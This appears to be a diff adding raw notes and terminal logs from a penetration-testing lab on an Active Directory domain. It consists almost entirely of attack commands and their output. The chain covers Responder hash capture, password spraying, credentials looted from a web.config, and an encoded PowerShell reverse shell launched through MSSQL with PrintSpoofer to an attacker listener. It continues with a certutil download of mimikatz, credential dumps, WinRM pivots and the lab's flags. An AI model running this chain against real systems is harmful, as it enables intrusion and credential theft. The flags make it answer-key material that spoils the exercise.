@@ -1,0 +1,632 @@
+└──╼ $crackmapexec smb 172.16.7.0/24 
+SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
+SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+
+sudo responder -I ens224 -v
+
+[SMB] NTLMv2-SSP Client   : 172.16.7.3
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
+[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:ffb83df7bae811cc:8E756B1F20701DB4120C3AD1CC0DC162:010100000000000080D36CA8E768DB0199A2E9091D83F30A0000000002000800540057003300560001001E00570049004E002D003800570034004F004600500050004400300030004F0004003400570049004E002D003800570034004F004600500050004400300030004F002E0054005700330056002E004C004F00430041004C000300140054005700330056002E004C004F00430041004C000500140054005700330056002E004C004F00430041004C000700080080D36CA8E768DB01060004000200000008003000300000000000000000000000002000009FA56E132882123A20B8D5D50C8A6EAD29AD586C147430CBA02C1DE5AAD1787C0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
+
+AB920:weasal
+
+┌─[htb-student@skills-par01]─[~]
+└──╼ $evil-winrm -i 172.16.7.50 -u AB920 -p weasal                                                                                                                                           
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\AB920\Documents> cd C:\flag.txt
+Cannot find path 'C:\flag.txt' because it does not exist.
+At line:1 char:1
++ cd C:\flag.txt
++ ~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\flag.txt:String) [Set-Location], ItemNotFoundException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
+*Evil-WinRM* PS C:\Users\AB920\Documents> type C:\flag.txt
+aud1t_gr0up_m3mbersh1ps!
+
+rpcclient 172.16.7.3 -U "AB920%weasal" -c "enumdomusers" | awk -F[ '{print $2}' | awk -F] '{print $1}' > user.txt
+crackmapexec smb 172.16.7.3 -u user.txt -p "Welcome1"
+SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\BR086:Welcome1
+
+smbclient //172.16.7.3/"Department Shares" -U "BR086%Welcome1"
+smb: \IT\Private\Development\> mget web.config
+Get file web.config? yes
+getting file \IT\Private\Development\web.config of size 1203 as web.config (117.5 KiloBytes/sec) (average 117.5 KiloBytes/sec)
+smb: \IT\Private\Development\> exit
+┌─[htb-student@skills-par01]─[~]
+└──╼ $cat web.config                                                                                                                                                                         
+<?xml version="1.0" encoding="utf-8"?>
+
+<configuration> 
+    <system.web>
+       <membership>
+           <providers>
+               <add name="WebAdminMembershipProvider" type="System.Web.Administration.WebAdminMembershipProvider" />
+           </providers>
+       </membership>
+       <httpModules>
+              <add name="WebAdminModule" type="System.Web.Administration.WebAdminModule"/>
+        </httpModules>
+        <authentication mode="Windows"/>
+        <authorization>
+              <allow users="netdb"/>
+        </authorization>
+        <identity impersonate="true"/>
+       <trust level="Full"/>
+       <pages validateRequest="true"/>
+       <globalization uiCulture="auto:en-US" />
+           <masterDataServices>  
+            <add key="ConnectionString" value="server=Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS;database=master;Integrated Security=SSPI;Pooling=true"/> 
+       </masterDataServices>  
+       <connectionStrings>
+           <add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername")+'\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>
+       </connectionStrings>
+  </system.web>
+</configuration>
+
+┌─[htb-student@skills-par01]─[~]
+└──╼ $crackmapexec mssql 172.16.7.60 -u netdb -p "D@ta_bAse_adm1n!" --local-auth                                                                                                             
+MSSQL       172.16.7.60     1433   SQL01            [*] Windows 10.0 Build 17763 (name:SQL01) (domain:SQL01)
+MSSQL       172.16.7.60     1433   SQL01            [+] netdb:D@ta_bAse_adm1n! (Pwn3d!)
+
+
+┌─[htb-student@skills-par01]─[/tmp]
+└──╼ $crackmapexec mssql 172.16.7.60 -u netdb -p "D@ta_bAse_adm1n!" --local-auth -X "C:\Users\Public\Documents\PrintSpoofer64.exe -c \"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADEAMgAzADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\""
+┌─[✗]─[htb-student@skills-par01]─[~]
+└──╼ $nc -nlvp 1233                                                                                                                                                                          
+listening on [any] 1233 ...
+connect to [172.16.7.240] from (UNKNOWN) [172.16.7.60] 63542
+whoami
+nt authority\system
+PS C:\Windows\system32>
+
+crackmapexec mssql 172.16.7.60 -u netdb -p "D@ta_bAse_adm1n!" --local-auth -X "certutil -urlcache -f http://172.16.7.240:8000/mimikatz64_22.exe C:\Users\Public\Documents\mimikatz64_22.exe"
+PS C:\Users\Public\Documents> ./mimikatz64_22.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > file.txt
+PS C:\Users\Public\Documents> cat file.txt
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+568     {0;000003e7} 1 D 36271          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 0 D 2008602     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 2042621     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::sam
+Domain : SQL01
+SysKey : 2cdbbee2d1fb9cfb7cf7189fa66971a6
+Local SID : S-1-5-21-3827174835-953655006-33323432
+
+SAMKey : 1f3713f605ea38af43344dc944dea5ce
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 136b3ddfbb62cb02e53a8f661248f364
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 81758876d60e11231820a371178e3530
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SQL01.INLANEFREIGHT.LOCALAdministrator
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : ebac626a2675b1b19821f89b42bf783f458b11578aa6d94a7d9d3baebdcf0b6e
+      aes128_hmac       (4096) : c4006bb6f49cd841aa764621e0fbbf5d
+      des_cbc_md5       (4096) : 45b0c16d26cd29e5
+    OldCredentials
+      aes256_hmac       (4096) : a6b660de661c6a558a414560082262069223fb9815fab1f08169e0bb3954bc10
+      aes128_hmac       (4096) : da03dd69f9d316baf21d16bb0639a559
+      des_cbc_md5       (4096) : ef9898bf10c754b5
+    OlderCredentials
+      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
+      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
+      des_cbc_md5       (4096) : 9876615285c2766e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : SQL01.INLANEFREIGHT.LOCALAdministrator
+    Credentials
+      des_cbc_md5       : 45b0c16d26cd29e5
+    OldCredentials
+      des_cbc_md5       : ef9898bf10c754b5
+
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WDAGUtilityAccount
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
+      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
+      des_cbc_md5       (4096) : 61299e7a768fa2d5
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:Kerberos *
+    Default Salt : WDAGUtilityAccount
+    Credentials
+      des_cbc_md5       : 61299e7a768fa2d5
+
+
+mimikatz(commandline) # exit
+Bye!
+
+PS C:\Users\Public\Documents> ./mimikatz64_22.exe "privilege::debug" "sekurlsa::LogonPasswords" "exit" > file2.txt
+PS C:\Users\Public\Documents> cat file2.txt
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # privilege::debug
+Privilege '20' OK
+
+mimikatz(commandline) # sekurlsa::LogonPasswords
+
+Authentication Id : 0 ; 121785 (00000000:0001dbb9)
+Session           : Service from 0
+User Name         : MSSQL$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:30 PM
+SID               : S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 41970 (00000000:0000a3f2)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:28 PM
+SID               : S-1-5-96-0-1
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 41934 (00000000:0000a3ce)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:28 PM
+SID               : S-1-5-96-0-0
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 119395 (00000000:0001d263)
+Session           : Service from 0
+User Name         : SQLTELEMETRY$SQLEXPRESS
+Domain            : NT Service
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:30 PM
+SID               : S-1-5-80-1985561900-798682989-2213159822-1904180398-3434236965
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 71546 (00000000:0001177a)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:29 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : SQL01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:27 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : sql01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : SQL01$
+Domain            : INLANEFREIGHT
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:28 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : sql01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : b1 dd e2 05 26 9c 70 7d 82 58 a4 eb ea 2d ee 83 07 22 87 35 b4 3b b8 98 79 c0 54 fd 6a 30 23 9a 2a 41 31 a6 7f 0b 2a dd 80 ad b4 9c d5 e8 ec 84 ca 5e 4c 0c d5 c2 74 bc c4 8b e5 b6 aa 6f d6 be 52 1d 86 06 c5 24 97 1f 43 46 79 8c 3f 90 67 28 81 d0 c2 2b 93 97 98 0d 87 00 7e 4c ae 10 e1 e0 5b 3e 46 7b b3 c2 1c bb 01 35 8c ae 6c f2 fb 4a 56 41 b1 7b 20 78 2b f3 de 91 8b 0d 4e 8b 71 44 45 d2 e1 e8 9b 80 67 6d 97 5a f2 42 aa a0 39 fc 4b 6e 61 79 db 09 3c be e8 a3 5d 08 44 d4 c1 67 06 d3 c2 66 cf c3 f2 13 14 a2 1a 18 6a 82 28 37 4e 10 d9 f5 a5 c7 f9 38 88 fa 43 82 81 8a 0f f3 78 14 73 aa 46 5d 6a d0 a3 a8 bc 47 97 9c a8 eb 5c 73 de ff 83 fe 0c 39 f9 93 c5 26 ff a4 7e fb bb 0b c9 04 0b bb 45 37 00 ae 66 10 38 d8 d1 e5 
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 213739 (00000000:000342eb)
+Session           : Interactive from 1
+User Name         : mssqlsvc
+Domain            : INLANEFREIGHT
+Logon Server      : DC01
+Logon Time        : 1/17/2025 12:37:42 PM
+SID               : S-1-5-21-3327542485-274640656-2609762496-4613
+        msv :
+         [00000003] Primary
+         * Username : mssqlsvc
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 8c9555327d95f815987c0d81238c7660
+         * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
+         * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
+        tspkg :
+        wdigest :
+         * Username : mssqlsvc
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : mssqlsvc
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : Sup3rS3cur3maY5ql$3rverE
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:29 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 71564 (00000000:0001178c)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:29 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 6991907663e3f68922d24ac9a573e2c3
+         * SHA1     : 33058b24d5882f1dd18ce81988aa64226e2879b5
+        tspkg :
+        wdigest :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * Password : (null)
+        kerberos :
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT.LOCAL
+         * Password : ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkT%c3)R+c&xcu_:]n#V1V.j[=+GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 40753 (00000000:00009f31)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 1/17/2025 12:37:27 PM
+SID               : 
+        msv :
+         [00000003] Primary
+         * Username : SQL01$
+         * Domain   : INLANEFREIGHT
+         * NTLM     : 50f027d462c70d9092bae30427841a77
+         * SHA1     : a9ac317d8132aabdf7cb75d632da44b59f722e93
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+mimikatz(commandline) # exit
+Bye!
+
+┌─[✗]─[htb-student@skills-par01]─[~]
+└──╼ $crackmapexec winrm 172.16.7.50 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE'
+WINRM       172.16.7.50     5985   NONE             [*] None (name:172.16.7.50) (domain:None)
+WINRM       172.16.7.50     5985   NONE             [*] http://172.16.7.50:5985/wsman
+WINRM       172.16.7.50     5985   NONE             [+] None\mssqlsvc:Sup3rS3cur3maY5ql$3rverE (Pwn3d!)
+┌─[htb-student@skills-par01]─[~]
+└──╼ $evil-winrm -i 172.16.7.50 -u mssqlsvc -p 'Sup3rS3cur3maY5ql$3rverE'
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
+exc3ss1ve_adm1n_r1ights!
+*Evil-WinRM* PS C:\Users\Administrator\Desktop>
+
+/usr/local/bin/bloodhound-python -c ALL --zip -u "mssqlsvc" -p 'Sup3rS3cur3maY5ql$3rverE' -d "INLANEFREIGHT.LOCAL" -dc dc01.inlanefreight.local -ns 172.16.7.3
+
+*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> upload /tmp/Inveigh.exe Inveigh.exe
+Info: Uploading /tmp/Inveigh.exe to Inveigh.exe
+
+                                                             
+Data: 7491584 bytes of 7491584 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> ls
+
+
+    Directory: C:\Users\mssqlsvc\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        1/17/2025   4:29 PM        5618688 Inveigh.exe
+-a----        1/17/2025   4:21 PM        1252593 Inveigh.ps1
+-a----        1/17/2025   3:48 PM        1051648 SharpHound4.exe
+
+
+*Evil-WinRM* PS C:\Users\mssqlsvc\Documents> ./Inveigh.exe
+[*] Inveigh 2.0.10 [Started 2025-01-17T16:30:03 | PID 664]
+[+] Packet Sniffer Addresses [IP 172.16.7.50 | IPv6 fe80::5556:c089:604f:1d91%9]
+[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
+[+] Spoofer Reply Addresses [IP 172.16.7.50 | IPv6 fe80::5556:c089:604f:1d91%9]
+[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
+[ ] DHCPv6
+[+] DNS Packet Sniffer [Type A]
+[ ] ICMPv6
